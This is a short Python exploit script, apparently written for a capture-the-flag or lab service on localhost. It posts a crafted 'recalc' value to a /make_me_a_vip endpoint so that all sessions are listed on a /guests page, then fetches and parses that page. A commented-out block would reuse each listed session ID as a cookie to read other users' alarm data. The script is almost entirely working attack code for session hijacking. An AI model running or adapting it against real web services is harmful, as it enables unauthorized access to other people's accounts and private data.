import requests
from bs4 import BeautifulSoup

HOST = 'localhost'
PORT = 7353

URL = f"http://{HOST}:{PORT}"


def get_table_data(soup):
    data = []
    try:
        table = soup.find_all('table')[1]
    except IndexError:
        return [[]]

    table_body = table.find('tbody')

    rows = table_body.find_all('tr')
    for row in rows:
        cols = row.find_all('td')
        cols = [ele.text.strip() for ele in cols]
        data.append([ele for ele in cols if ele])
    return data


if __name__ == '__main__':
    session = requests.Session()

    # init
    session.get(URL)

    # make all sessions appear on the /guest page
    exploit_params = {'recalc': 'None'}
    session.post(URL + '/make_me_a_vip', data=exploit_params)

    guests = session.get(f"{URL}/guests")
    soup = BeautifulSoup(guests.text, 'html.parser')

    # guest_session_ids = get_table_data(soup)
    # print(f"Found {len(guest_session_ids)} sessions.")
    # for guest in guest_session_ids:
    #     session.cookies['session_id'] = guest[0]
    #     alarms = session.get(f"{URL}/guest")
    #     soup = BeautifulSoup(alarms.text, 'html.parser')
    #     alarm_data = get_table_data(soup)
    #     if alarm_data:
    #         for row in alarm_data:
    #             if row:
    #                 print(row[1])
